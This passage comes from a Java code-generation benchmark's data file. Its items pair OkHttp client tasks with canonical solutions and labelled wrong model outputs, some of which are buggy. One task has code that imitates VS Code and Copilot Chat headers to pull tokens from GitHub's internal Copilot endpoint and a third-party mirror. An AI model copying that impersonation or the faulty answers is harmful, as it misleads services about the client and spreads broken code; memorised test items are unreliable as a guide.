    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport okhttp3.Call;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONObject;\nimport org.json.JSONArray;\n\npublic class DanbooruApiClient {\n    private static final String DOMAIN = \"https://danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private final Pattern gidPattern = Pattern.compile(\"/posts/(\\\\d+)\");\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    public JSONObject getPage(int pageNum) throws IOException {\n        currentPageNum = pageNum;\n        String url = DOMAIN + \"/posts.json?page=\" + currentPageNum;\n        Request request = new Request.Builder().url(url).build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            return new JSONObject(responseBody);\n        }\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> urls = new ArrayList<>();\n        JSONArray posts = json.getJSONArray(\"posts\");\n\n        for (int i = 0; i < posts.length(); i++) {\n            JSONObject post = posts.getJSONObject(i);\n            String imageUrl = post.getString(\"file_url\");\n            urls.add(DOMAIN + imageUrl);\n        }\n\n        return urls;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        Matcher matcher = gidPattern.matcher(url.toString());\n        if (matcher.find()) {\n            return matcher.group(1);\n        } else {\n            throw new MalformedURLException(\"Invalid URL format: tag not found\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 244,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for expanding medical terminology value sets using the OkHttp library.\n\nClass Description: The TerminologyServiceClient class provides functionality to interact with a FHIR terminology service to expand value sets. It handles HTTP requests and responses, URL validation, and error handling.\n\nAttributes:\n- client: OkHttpClient - A shared HTTP client instance for making requests\n- urlValidator: UrlValidator - A validator for checking URL formats with support for double slashes\n- expandBaseUrl: String - The base URL for the value set expansion endpoint\n\nMethods:\n- setBaseUrl(String url) -> void - Sets the base URL for the terminology service by appending the value set expansion endpoint path\n- expandValueSet(String valueSetUri) -> Response - Makes a GET request to expand a value set, validates the input URI, and returns the HTTP response",
    "Canonical_solution": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private static OkHttpClient client = new OkHttpClient();\n    private static UrlValidator urlValidator = new UrlValidator(UrlValidator.ALLOW_2_SLASHES);\n    private static String expandBaseUrl;\n\n    public static void setBaseUrl(String url) {\n        expandBaseUrl = url + \"/ValueSet/$expand?url=\";\n    }\n\n    public static Response expandValueSet(String valueSetUri) {\n        if (!urlValidator.isValid(valueSetUri)) {\n            throw new IllegalArgumentException(\"Invalid ValueSet URI\");\n        }\n\n        Request request = new Request.Builder()\n                .url(expandBaseUrl + valueSetUri)\n                .header(\"Accept\", \"application/json\")\n                .build();\n\n        try {\n            Response response = client.newCall(request).execute();\n            ResponseBody body = response.body();\n            if (body == null) {\n                throw new RuntimeException(\"Value Set Expansion contained no body\");\n            }\n            return response;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Issue when expanding the value set\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private final OkHttpClient client = new OkHttpClient();\n    private final UrlValidator urlValidator = new UrlValidator(new String[]{\"http\", \"https\"}, UrlValidator.ALLOW_LOCAL_URLS | UrlValidator.ALLOW_2_SLASHES);\n    private String expandBaseUrl;\n\n    public void setBaseUrl(String url) {\n        if (url == null || !urlValidator.isValid(url)) {\n            throw new IllegalArgumentException(\"Invalid base URL: \" + url);\n        }\n        this.expandBaseUrl = url + \"/ValueSet/$expand\";\n    }\n\n    public Response expandValueSet(String valueSetUri) {\n        if (valueSetUri == null || valueSetUri.isEmpty()) {\n            throw new IllegalArgumentException(\"ValueSet URI cannot be null or empty\");\n        }\n        if (!valueSetUri.startsWith(\"http\")) {\n            throw new IllegalArgumentException(\"ValueSet URI must be a valid HTTP(S) URL\");\n        }\n\n        String url = expandBaseUrl + \"?url=\" + valueSetUri;\n        Request request = new Request.Builder()\n                .url(url)\n                .build();\n\n        try {\n            return client.newCall(request).execute();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error expanding ValueSet: \" + e.getMessage(), e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for interacting with GitHub Copilot and CoCoPilot services, including token retrieval and request execution capabilities.\n\nClass Description: The ApiClient class provides functionality to interact with GitHub Copilot and CoCoPilot APIs. It handles HTTP requests, manages headers, and processes responses. The class maintains a reusable HTTP client with configurable timeouts and generates unique identifiers for tracking requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used for making requests\n- machineId: String - A unique identifier generated for the machine (static final)\n\nMethods:\n- ApiClient() -> None - Constructor that initializes the HTTP client with timeout configurations\n- generateMachineId() -> String - Generates a unique machine identifier using UUID (private static)\n- getCopilotToken(String apiKey) -> String - Retrieves a Copilot token using the provided API key\n- getCoCoToken(String apiKey) -> String - Retrieves a CoCoPilot token using the provided API key\n- executeRequest(String url, String method, String body, Map<String, String> headers) -> Response - Executes a generic HTTP request with specified parameters\n- createHeaders(String chatToken) -> Map<String, String> - Creates a standard set of headers for API requests using the provided chat token",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport okhttp3.*;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\npublic class ApiClient {\n    private final OkHttpClient client;\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(3, TimeUnit.MINUTES)\n                .readTimeout(5, TimeUnit.MINUTES)\n                .writeTimeout(5, TimeUnit.MINUTES)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.github.com\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.org/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.cocopilot.org\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        RequestBody requestBody = RequestBody.create(body, JSON);\n        \n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url);\n        \n        if (\"POST\".equalsIgnoreCase(method)) {\n            requestBuilder.post(requestBody);\n        } else if (\"GET\".equalsIgnoreCase(method)) {\n            requestBuilder.get();\n        }\n        \n        headers.forEach(requestBuilder::addHeader);\n        Request request = requestBuilder.build();\n        \n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headersMap = new HashMap<>();\n        headersMap.put(\"Host\", \"api.githubcopilot.com\");\n        headersMap.put(\"Accept-Encoding\", \"gzip, deflate, br\");\n        headersMap.put(\"Accept\", \"*/*\");\n        headersMap.put(\"Authorization\", \"Bearer \" + chatToken);\n        headersMap.put(\"X-Request-Id\", UUID.randomUUID().toString());\n        headersMap.put(\"X-Github-Api-Version\", \"2023-07-07\");\n        headersMap.put(\"Vscode-Sessionid\", UUID.randomUUID().toString() + System.currentTimeMillis());\n        headersMap.put(\"vscode-machineid\", machineId);\n        headersMap.put(\"Editor-Version\", \"vscode/1.85.0\");\n        headersMap.put(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\");\n        headersMap.put(\"Openai-Organization\", \"github-copilot\");\n        headersMap.put(\"Copilot-Integration-Id\", \"vscode-chat\");\n        headersMap.put(\"Openai-Intent\", \"conversation-panel\");\n        headersMap.put(\"User-Agent\", \"GitHubCopilotChat/0.11.1\");\n        return headersMap;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\n\nimport okhttp3.*;\n\npublic class ApiClient {\n    private static final String machineId = generateMachineId();\n    private final OkHttpClient client;\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)\n                .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString().replace(\"-\", \"\");\n    }\n\n    public String getCopilotToken(String apiKey) {\n        // Placeholder for actual token retrieval logic\n        return \"copilot-token\";\n    }\n\n    public String getCoCoToken(String apiKey) {\n        // Placeholder for actual token retrieval logic\n        return \"cocopilot-token\";\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        if (\"POST\".equals(method)) {\n            MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n            RequestBody requestBody = RequestBody.create(body, JSON);\n            requestBuilder.post(requestBody);\n        } else {\n            requestBuilder.get();\n        }\n\n        Request request = requestBuilder.headers(Headers.of(headers)).build();\n\n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + chatToken);\n        headers.put(\"User-Agent\", \"ApiClient/1.0\");\n        headers.put(\"X-GitHub-Machine-Id\", machineId);\n        return headers;\n    }\n}\n```"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests to a RESTful API using the OkHttp client library, with support for both GET and POST methods, including timeout configuration and proper resource cleanup.\n\nClass Description: GHMatrixBatchRequester is a utility class designed to make HTTP requests to a GraphHopper matrix API. It provides methods for sending GET and POST requests, handles response processing, and includes timeout configurations for network operations.\n\nAttributes:\n- logger: Logger - Used for logging debug and error information\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Constructor: GHMatrixBatchRequester() -> void - Initializes the HTTP client with default timeout settings (5 seconds for connect and read)\n- Constructor: GHMatrixBatchRequester(OkHttpClient) -> void - Allows injection of a custom configured OkHttpClient instance\n- getJson: getJson(String url) -> JsonResult - Sends a GET request to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers\n- postJson: postJson(String url, JsonNode requestJson) -> JsonResult - Sends a POST request with JSON payload to the specified URL and returns the response as a JsonResult object containing the response body, status code, and headers",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.net.SocketTimeoutException;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GHMatrixBatchRequester {\n\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(5, TimeUnit.SECONDS)\n                .readTimeout(5, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    protected JsonResult getJson(String url) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n\n    protected JsonResult postJson(String url, JsonNode requestJson) throws IOException {\n        Request okRequest = new Request.Builder().url(url)\n                .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                .post(createRequestBody(requestJson))\n                .build();\n        ResponseBody body = null;\n        try {\n            Response rsp = client.newCall(okRequest).execute();\n            body = rsp.body();\n            return new JsonResult(body.string(), rsp.code(), rsp.headers().toMultimap());\n        } finally {\n            if (body != null) {\n                body.close();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.*;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport com.fasterxml.jackson.databind.JsonNode;\n\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class GHMatrixBatchRequester {\n    private static final Logger logger = LoggerFactory.getLogger(GHMatrixBatchRequester.class);\n    private OkHttpClient client;\n\n    public GHMatrixBatchRequester() {\n        this(OkHttpClientProvider.getDefaultClient());\n    }\n\n    public GHMatrixBatchRequester(OkHttpClient client) {\n        this.client = client;\n    }\n\n    public JsonResult getJson(String url) {\n        Request request = new Request.Builder()\n                .url(url)\n                .get()\n                .build();\n\n        return executeRequest(request);\n    }\n\n    public JsonResult postJson(String url, JsonNode requestJson) {\n        String jsonBody;\n        try {\n            jsonBody = requestJson.toString();\n        } catch (Exception e) {\n            logger.error(\"Failed to convert JSON node to string\", e);\n            return new JsonResult(500, null, null);\n        }\n\n        RequestBody body = RequestBody.create(jsonBody, MediaType.get(\"application/json; charset=utf-8\"));\n        Request request = new Request.Builder()\n                .url(url)\n                .post(body)\n                .build();\n\n        return executeRequest(request);\n    }\n\n    private JsonResult executeRequest(Request request) {\n        try (Response response = client.newCall(request).execute()) {\n            ResponseBody responseBody = response.body();\n            String bodyString = responseBody != null ? responseBody.string() : null;\n\n            Map<String, List<String>> headersMap = Headers.toMultimap(response.headers());\n\n            return new JsonResult(response.code(), bodyString, headersMap);\n        } catch (IOException e) {\n            logger.error(\"HTTP request failed\", e);\n            return new JsonResult(502, \"Error: \" + e.getMessage(), null);\n        }\n    }\n\n    public static class JsonResult {\n        private final int statusCode;\n        private final String body;\n        private final Map<String, List<String>> headers;\n\n        public JsonResult(int statusCode, String body, Map<String, List<String>> headers) {\n            this.statusCode = statusCode;\n            this.body = body;\n            this.headers = headers;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public Map<String, List<String>> getHeaders() {\n            return headers;\n        }\n    }\n\n    private static class OkHttpClientProvider {\n        static OkHttpClient getDefaultClient() {\n            return new OkHttpClient.Builder()\n                    .connectTimeout(5, TimeUnit.SECONDS)\n                    .readTimeout(5, TimeUnit.SECONDS)\n                    .writeTimeout(5, TimeUnit.SECONDS)\n                    .build();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Create a Java class that implements a web scraper using the OkHttp library to make HTTP requests, handle authentication, and process responses with retry logic for failed attempts.\n\nClass Description: The Scraper class provides functionality to scrape content from web URLs using HTTP requests. It supports basic authentication and includes timeout handling with retry logic for failed requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used to make requests\n\nMethods:\n- Scraper() -> None - Constructor that initializes the OkHttpClient instance\n- scrape(String url, long timeoutMillis) -> List<String> - Scrapes content from the given URL without authentication, with a specified timeout\n- scrape(String url, String user, String password, long timeoutMillis) -> List<String> - Scrapes content from the given URL with basic authentication, with a specified timeout",
    "Canonical_solution": "import okhttp3.Credentials;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class Scraper {\n\n    private OkHttpClient client;\n    \n    public Scraper() {\n        this.client = new OkHttpClient();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) {\n        return scrape(url, null, null, timeoutMillis);\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) {\n        long start = System.currentTimeMillis();\n        Exception exception = null;\n        while (System.currentTimeMillis() - start < timeoutMillis) {\n            try {\n                Request.Builder requestBuilder = new Request.Builder()\n                        .header(\"Accept\", \"application/openmetrics-text; version=1.0.0; charset=utf-8\")\n                        .url(url);\n                if (user != null && password != null) {\n                    requestBuilder.header(\"Authorization\", Credentials.basic(user, password));\n                }\n                Request request = requestBuilder.build();\n                try (Response response = client.newCall(request).execute()) {\n                    if (response.code() != 200) {\n                        throw new IOException(\"Received HTTP Status \" + response.code() + \": \" + response.body().string());\n                    }\n                    return Arrays.asList(response.body().string().split(\"\\\\n\"));\n                }\n            } catch (Exception e) {\n                exception = e;\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        }\n        if (exception != null) {\n            exception.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Base64;\nimport java.util.List;\n\npublic class Scraper {\n    private final OkHttpClient client;\n\n    public Scraper() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n    }\n\n    public List<String> scrape(String url, long timeoutMillis) {\n        return scrapeWithRetry(url, null, null, timeoutMillis, 3);\n    }\n\n    public List<String> scrape(String url, String user, String password, long timeoutMillis) {\n        return scrapeWithRetry(url, user, password, timeoutMillis, 3);\n    }\n\n    private List<String> scrapeWithRetry(String url, String user, String password, long timeoutMillis, int maxRetries) {\n        Request request = buildRequest(url, user, password);\n\n        OkHttpClient limitedClient = createClientWithTimeout(timeoutMillis);\n\n        for (int attempt = 0; attempt < maxRetries; attempt++) {\n            try (Response response = limitedClient.newCall(request).execute()) {\n                if (response.isSuccessful()) {\n                    return extractLines(response.body().string());\n                } else {\n                    throw new IOException(\"Unexpected code \" + response);\n                }\n            } catch (IOException e) {\n                if (attempt == maxRetries - 1) {\n                    throw new RuntimeException(\"Failed after \" + maxRetries + \" attempts\", e);\n                }\n            }\n        }\n        return new ArrayList<>();\n    }\n\n    private Request buildRequest(String url, String user, String password) {\n        Request.Builder builder = new Request.Builder().url(url);\n        if (user != null && password != null) {\n            String credential = Base64.getEncoder().encodeToString((user + \":\" + password).getBytes());\n            builder.header(\"Authorization\", \"Basic \" + credential);\n        }\n        return builder.build();\n    }\n\n    private OkHttpClient createClientWithTimeout(long timeoutMillis) {\n        return new OkHttpClient.Builder()\n                .connectTimeout(timeoutMillis, java.util.concurrent.TimeUnit.MILLISECONDS)\n                .readTimeout(timeoutMillis, java.util.concurrent.TimeUnit.MILLISECONDS)\n                .writeTimeout(timeoutMillis, java.util.concurrent.TimeUnit.MILLISECONDS)\n                .build();\n    }\n\n    private List<String> extractLines(String content) {\n        List<String> lines = new ArrayList<>();\n        for (String line : content.split(\"\\\\r?\\\\n\")) {\n            lines.add(line);\n        }\n        return lines;\n    }\n}\n```"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Implement a Kafka Producer class for handling Dead Letter Queue (DLQ) messages in a rule-based processing system. The class should be able to configure a Kafka producer, convert various message types to bytes, populate message headers with rule context information, and send messages to a DLQ topic.\n\nClass Description: The `DlqAction` class is responsible for sending failed messages to a Dead Letter Queue (DLQ) topic in Kafka. It handles message serialization, header population, and asynchronous message sending with error handling. The class implements a `RuleAction` interface and provides configuration options for the DLQ topic and producer behavior.\n\nAttributes:\n\n- `log`: Logger - Logger instance for logging messages\n- `TYPE`: String - Constant identifying this action type as \"DLQ\"\n- `DLQ_TOPIC`: String - Configuration key for DLQ topic name\n- `DLQ_AUTO_FLUSH`: String - Configuration key for auto-flush setting\n- `PRODUCER`: String - Configuration key for producer instance\n- `HEADER_PREFIX`: String - Prefix for rule-related headers\n- `RULE_NAME`: String - Header key for rule name\n- `RULE_MODE`: String - Header key for rule mode\n- `RULE_SUBJECT`: String - Header key for rule subject\n- `RULE_TOPIC`: String - Header key for original topic\n- `RULE_EXCEPTION`: String - Header key for exception message\n- `configs`: Map<String, ?> - Configuration properties for the producer\n- `topic`: String - DLQ topic name\n- `autoFlush`: boolean - Flag for automatic flushing after send\n- `producer`: KafkaProducer<byte[], byte[]> - Kafka producer instance\n\nMethods:\n\n- `configure(Map<String, ?> configs)`: void - Configures the DLQ action with producer settings and topic name\n- `run(RuleContext ctx, Object message, RuleException ex)`: void - Processes and sends the message to DLQ topic\n- `producer()`: KafkaProducer<byte[], byte[]> - Returns or creates a Kafka producer instance\n- `convertToBytes(RuleContext ctx, Object message)`: byte[] - Converts various message types to byte arrays\n- `convertToJsonBytes(RuleContext ctx, Object message)`: byte[] - Converts objects to JSON byte arrays\n- `populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex)`: void - Adds rule context information to message headers\n- `toBytes(String value)`: byte[] - Helper method to convert strings to UTF-8 bytes\n- `baseProducerConfigs()`: Map<String, Object> - Creates base configuration for Kafka producer\n- `close()`: void - Closes the Kafka producer when no longer needed",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport io.confluent.kafka.schemaregistry.utils.JacksonMapper;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.errors.SerializationException;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.serialization.DoubleSerializer;\nimport org.apache.kafka.common.serialization.FloatSerializer;\nimport org.apache.kafka.common.serialization.IntegerSerializer;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.ShortSerializer;\nimport org.apache.kafka.common.utils.Bytes;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DlqAction implements RuleAction {\n\n  private static final Logger log = LoggerFactory.getLogger(DlqAction.class);\n\n  public static final String TYPE = \"DLQ\";\n  public static final String DLQ_TOPIC = \"dlq.topic\";\n  public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n  public static final String PRODUCER = \"producer\";\n  public static final String HEADER_PREFIX = \"__rule.\";\n  public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n  public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n  public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n  public static final String RULE_TOPIC = HEADER_PREFIX + \"topic\";\n  public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n  private static final LongSerializer LONG_SERIALIZER = new LongSerializer();\n  private static final IntegerSerializer INT_SERIALIZER = new IntegerSerializer();\n  private static final ShortSerializer SHORT_SERIALIZER = new ShortSerializer();\n  private static final DoubleSerializer DOUBLE_SERIALIZER = new DoubleSerializer();\n  private static final FloatSerializer FLOAT_SERIALIZER = new FloatSerializer();\n\n  private Map<String, ?> configs;\n  private String topic;\n  private boolean autoFlush;\n  private volatile KafkaProducer<byte[], byte[]> producer;\n\n  @Override\n  public void configure(Map<String, ?> configs) {\n    this.configs = configs;\n    this.topic = (String) configs.get(DLQ_TOPIC);\n    Object autoFlushConfig = configs.get(DLQ_AUTO_FLUSH);\n    if (autoFlushConfig != null) {\n      this.autoFlush = Boolean.parseBoolean(autoFlushConfig.toString());\n    }\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n  }\n\n  public void run(RuleContext ctx, Object message, RuleException ex) throws RuleException {\n    String topic = topic();\n    if (topic == null || topic.isEmpty()) {\n      topic = ctx.getParameter(DLQ_TOPIC);\n    }\n    if (topic == null || topic.isEmpty()) {\n      throw new SerializationException(\"Could not send to DLQ as no topic is configured\");\n    }\n    final String dlqTopic = topic;\n    try {\n      byte[] keyBytes = convertToBytes(ctx, ctx.originalKey());\n      byte[] valueBytes = convertToBytes(ctx, ctx.originalValue());\n      ProducerRecord<byte[], byte[]> producerRecord =\n          new ProducerRecord<>(dlqTopic, null, keyBytes, valueBytes, ctx.headers());\n      populateHeaders(ctx, producerRecord, ex);\n      producer().send(producerRecord, (metadata, exception) -> {\n        if (exception != null) {\n          log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, exception);\n        } else {\n          log.info(\"Sent message to DLQ topic {}\", dlqTopic);\n        }\n      });\n      if (autoFlush) {\n        producer.flush();\n      }\n    } catch (Exception e) {\n      log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, e);\n    }\n    throw ex != null ? new SerializationException(\"Rule failed: \" + ctx.rule().getName(), ex)\n        : new SerializationException(\"Rule failed: \" + ctx.rule().getName());\n  }\n\n  private KafkaProducer<byte[], byte[]> producer() {\n    if (producer == null) {\n      Map<String, Object> producerConfigs = baseProducerConfigs();\n      producerConfigs.putAll(configs);\n      synchronized (this) {\n        if (producer == null) {\n          producer = new KafkaProducer<>(producerConfigs);\n        }\n      }\n    }\n    return producer;\n  }\n\n  private byte[] convertToBytes(RuleContext ctx, Object message) throws IOException {\n    if (message == null) {\n      return null;\n    } else if (message instanceof byte[]) {\n      return (byte[]) message;\n    } else if (message instanceof ByteBuffer) {\n      ByteBuffer buffer = (ByteBuffer) message;\n      byte[] bytes = new byte[buffer.remaining()];\n      buffer.get(bytes);\n      return bytes;\n    } else if (message instanceof Bytes) {\n      return ((Bytes) message).get();\n    } else if (message instanceof String || message instanceof UUID) {\n      return message.toString().getBytes(StandardCharsets.UTF_8);\n    } else if (message instanceof Long) {\n      return LONG_SERIALIZER.serialize(ctx.topic(), (Long)message);\n    } else if (message instanceof Integer) {\n      return INT_SERIALIZER.serialize(ctx.topic(), (Integer) message);\n    } else if (message instanceof Short) {\n      return SHORT_SERIALIZER.serialize(ctx.topic(), (Short) message);\n    } else if (message instanceof Double) {\n      return DOUBLE_SERIALIZER.serialize(ctx.topic(), (Double) message);\n    } else if (message instanceof Float) {\n      return FLOAT_SERIALIZER.serialize(ctx.topic(), (Float) message);\n    } else {\n      return convertToJsonBytes(ctx, message);\n    }\n  }\n\n  private byte[] convertToJsonBytes(RuleContext ctx, Object message) throws IOException {\n    JsonNode json = ctx.target().toJson(message);\n    return JacksonMapper.INSTANCE.writeValueAsBytes(json);\n  }\n\n  private void populateHeaders(\n      RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n    Headers headers = producerRecord.headers();\n    headers.add(RULE_NAME, toBytes(ctx.rule().getName()));\n    headers.add(RULE_MODE, toBytes(ctx.ruleMode().name()));\n    headers.add(RULE_SUBJECT, toBytes(ctx.subject()));\n    headers.add(RULE_TOPIC, toBytes(ctx.topic()));\n    if (ex != null) {\n      headers.add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n  }\n\n  private byte[] toBytes(String value) {\n    if (value != null) {\n      return value.getBytes(StandardCharsets.UTF_8);\n    } else {\n      return null;\n    }\n  }\n\n  static Map<String, Object> baseProducerConfigs() {\n    Map<String, Object> producerProps = new HashMap<>();\n    producerProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, Long.toString(Long.MAX_VALUE));\n    